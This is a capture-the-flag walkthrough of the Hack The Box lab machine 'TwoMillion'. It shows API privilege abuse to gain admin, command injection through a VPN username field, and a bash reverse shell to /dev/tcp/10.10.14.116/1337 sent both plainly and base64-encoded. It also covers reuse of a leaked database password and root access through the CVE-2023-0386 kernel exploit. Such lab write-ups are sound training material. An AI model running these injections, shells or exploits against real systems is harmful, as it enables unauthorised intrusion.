- - - 
created : 17-09-2025 

Tags : #easy 

Released on 07 Jun 2023
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ rustscan -a 2million.htb -- -A 

Open 10.10.11.221:22
Open 10.10.11.221:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET
```
# Enumeration
## HTTP (80)

![Pasted image 20250917152934.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250917152934.png)
### InviteAPI Code
 
```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

you can beautify the minified JavaScript using tools like [de4js](https://lelinhtinh.github.io/de4js/).

We can find the `makeInviteCode` function

```js
function verifyInviteCode(code) {
     var formData = {
         "code": code
    };
    $.ajax({
       type: "POST",
       dataType: "json",
       data: formData,
       url: '/api/v1/invite/verify',
       success: function (response) {
          console.log(response)
       },
       error: function (response) {
          console.log(response)
       }
   })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
       }
   })
}
```

There are two functions in the code above. The first one is similar to the one that we saw earlier in the invite
page, that can be used to verify an invite code. The second one is a little more interesting, as it can make a
POST request to /api/v1/invite/how/to/generate . This endpoint seems very interesting, so in order to
access it we can use `cURL`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."                                                                                                       
}                  
```

	Note: We use the -s switch so that cURL won't show the connection progress. We also use jq to
	beautify the outputted JSON

The output is in JSON format and contains some interesting data that seems encrypted. The encryption type
is hinted as being ROT13 which is basically a Caesars cipher. A hint is also visible that mentions we need to
identify the encryption type and decrypt it. The website rot13 can be used to decrypt the above data:

![Pasted image 20250917155306.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250917155306.png)
# Exploit
## Registering and Admin Access

We make a POST request to the mentioned endpoint:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "Vk5XSVctNk1HQjEtMUFOM1UtT01KQzk=",
    "format": "encoded"
  }
}
```

We have an invitation code, this time it seems to be encoded instead of encrypted
with what seems to be [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md). Let's decode  it in our terminal:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ echo 'Vk5XSVctNk1HQjEtMUFOM1UtT01KQzk=' | base64 -d
VNWIW-6MGB1-1AN3U-OMJC9        
```

Let's register with the username hacker , email  `test@2million.htb` and a random password of our choice.
After clicking register we are redirected to /login at which point we can use our newly created account to
login to the website:

![Pasted image 20250917160318.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250917160318.png)

The Access page allows a user to Download and Regenerate their VPN file to be able to access the HTB
infrastructure. We can use [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) to see what the `Connection Pack` download button does:

```
Upon clicking on the button a GET request is sent out to /api/v1/users/vpn/generate and in return the
VPN file for our current user is downloaded.
```

Let's try requesting the URL /api to see if anything interesting is returned:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -v http://2million.htb/api 

* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Wed, 17 Sep 2025 14:08:33 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=uldtu6lac0sa60ose75lp9vgkl; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact

```

We get a status code of `401 Unauthorized` . 

Let's try providing the website with our PHP session cookie which we can grab either from our browser or from Caido:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -sv 2million.htb/api --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" | jq 

* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 17 Sep 2025 14:10:57 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [47 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "/api/v1": "Version 1 of the API"
}
```

Now let's request /api/v1 to see if any endpoints are listed:

```bash

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" | jq 

<SNIP>

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}           
```

We get a list of quite a few endpoints that are available in the API, with some of the most interesting ones
being the admin specific endpoints. As a test we can hit the /admin/auth endpoint to check if we are an
admin user:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" | jq 

<SNIP>

{
  "message": false
}                   
```

As expected we are not currently an administrative user. Let's check out the /admin/vpn/generate
endpoint by switching our request to POST and including our cookie once more:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" | jq 

* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Wed, 17 Sep 2025 14:18:20 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [5 bytes data]
* Connection #0 to host 2million.htb left intact
```

We get `401 Unauthorized` because we are not an admin.

Now let's move to the final administrative endpoint, /admin/settings/update . We note that this request needs to be a PUT as shown in the output from /api/v1 :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" | jq  

<SNIP>

{
  "status": "danger",
  "message": "Invalid content type."
}
```

This time we do not get an Unauthorized error, but instead the API replies with Invalid content type . 

It is often for APIs to use JSON for sending and receiving data, and we already know that the API replies in JSON, so lets set the Content-Type header to JSON and try again:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" | jq

<SNIP>

{
  "status": "danger",
  "message": "Missing parameter: email"
}

```

We now get a new error message, specifically that there is a parameter missing called email . Let's supply
the email for our own user in JSON format:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" --data '{"email":"test@2million.htb"}' 

<SNIP>


  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

We get another error for a missing parameter called is_admin . Let's add this as well:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": true}' | jq  

<SNIP>

{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Since we set the parameter to true , an error message informs us that this variable needs a value of 0 or 1.
Let's set it to 1:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": '1'}' | jq 

<SNIP>

{
  "id": 15,
  "username": "hacker",
  "is_admin": 1
}
```

The above command seems to have been successful as our user information is returned and the is_admin
variable is set to 1. We can further verify this by accessing the /admin/auth endpoint that we saw earlier:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" | jq 

{
  "message": true
}
```

This time instead of an error we get the value true back indicating that we are indeed an admin now.
## Foothold

Let's check out the `/admin/vpn/generate` now:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl  -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" | jq  

{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

 Let's attempt to input a random username:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl  -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" --data '{"username":"test"}' | jq  

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
<SNIP>
```

username of the user that the VPN will be generated for, so let's attempt to input a random username.
After sending the above command we see that a VPN configuration file was generated for user test and
was printed out to us. If this VPN is being generated via the exec or system PHP function and there is
insufficient filtering in place - which is possible as this is an administrative only function - it might be
possible to inject malicious code in the username field and gain command execution on the remote system.
Let's test this assumption by injecting the command ;id; after the username:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl  -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" --data '{"username" : "hacker;id;"}'   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command is successful and we gain command execution. Let's start a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener to catch a shell:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...

```

We can then get a shell with the following payload:

```bash
bash -i >& /dev/tcp/10.10.14.116/1337 0>&1
```

We encode the payload in Base64 and add it to the following command:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ curl  -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=taijcct7knkbskmph99spt0pb0" -H "Content-Type: application/json" --data '{"username" : "hacker;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTYvMTMzNyAwPiYx= | base64 -d | bash;"}' 

```
# Lateral Movement - Privilege Escalation
## www-data to Admin

Enumeration of the web directory reveals a file called .env which contains database credentials for a user
called `admin`:

```bash
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The /etc/passwd file reveals that there is indeed a user on the system called `admin`:

```bash
www-data@2million:~/html$ cat /etc/passwd

<SNIP>

admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Owed to password re-use we can login as admin over [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with `SuperDuperPass123`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ ssh admin@2million.htb 

admin@2million:~$ sudo -l

[sudo] password for admin: 
Sorry, user admin may not run sudo on localhost.
```

The user flag can be found in `/home/admin`:

```bash
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt 
 HTB{{REDACTED_FLAG}}
```
## Admin to Root

Enumeration of the current user's mails in /var/mail reveals a file called admin , which contains all the
emails for our current user. Let's read it:

```
admin@2million:/var/mail$ cat admin                                                                     
From: ch4p <ch4p@2million.htb>                                                                          
To: admin <admin@2million.htb>                                                                          
Cc: g0blin <g0blin@2million.htb>                                                                        
Subject: Urgent: Patch System OS                                                                        
Date: Tue, 1 June 2023 10:45:22 -0700                                                                   
Message-ID: <9876543210@2million.htb>                                                                   
X-Mailer: ThunderMail Pro 5.2                                                                           
                                                                                                        
Hey admin,                                                                                              

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

The email originates from ch4p and is letting the admin know that he should perform updates on this
system as there have been some serious kernel exploits recently. More specifically an exploit for OverlayFS
/ FUSE is mentioned.
### Google Search

Let's perform a quick Google search with the keywords overlays fuse exploit .
The results reveal this article about an exploit which is assigned[ CVE-2023-0386](CVE-2023-0386.md), that exists in the Linux kernel.

https://ubuntu.com/security/CVE-2023-0386

Enumeration of the current kernel version reveals that the box is using `5.15.70`:

```bash
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

We can also see that the box is currently on the `Jammy` release:

```bash
admin@2million:/var/mail$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.2 LTS
Release:        22.04
Codename:       jammy
```
### Exploit

The affected kernel versions for jammy go up to 5.15.0-70.77 and as seen previously the box is using
5.15.70 so it is a good idea to test if it is vulnerable. There are multiple exploits available online, one of
which is this one on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) : https://github.com/xkaneiki/CVE-2023-0386

We clone the repo:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ git clone https://github.com/xkaneiki/CVE-2023-0386    
Clone in 'CVE-2023-0386' in corso...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0 (from 0)
Ricezione degli oggetti: 100% (24/24), 426.11 KiB | 437.00 KiB/s, fatto.
Risoluzione dei delta: 100% (7/7), fatto.
```

Compress the entire repository so that it is easier to upload:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ zip -r cve.zip CVE-2023-0386
```

Then upload it using `scp`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/TwoMillion]
└─$ scp cve.zip admin@2million.htb:/tmp
admin@2million.htb's password: 
cve.zip                                                               100%  460KB 270.6KB/s   00:01    
```

On the box, navigate to `/tmp` and unzip the contents of `cve.zip`:

```bash
admin@2million:/tmp$ unzip cve.zip                                                                      
Archive:  cve.zip
<SNIP>  
```

As per the instructions on the GitHub page, enter the CVE-2023-0386 directory and compile the code:

```bash
admin@2million:/tmp$ cd CVE-2023-0386/
admin@2million:/tmp/CVE-2023-0386$ ls
exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test

admin@2million:/tmp/CVE-2023-0386$ make all
```

	Note: The compilation throws a few warnings but these can be safely ignored.

Finally, let's run the exploit in two steps. We run the first command in the background:

```
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 2071
admin@2million:/tmp/CVE-2023-0386$ [+] len of gc: 0x3ee0

```

Then we execute the exp binary in the foreground:

```
./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Sep 17 15:22 .
drwxrwxr-x 6 root   root     4096 Sep 17 15:22 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

The exploit is successful as shown from the `id` command and the root flag can be found in `/root`:

```bash
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!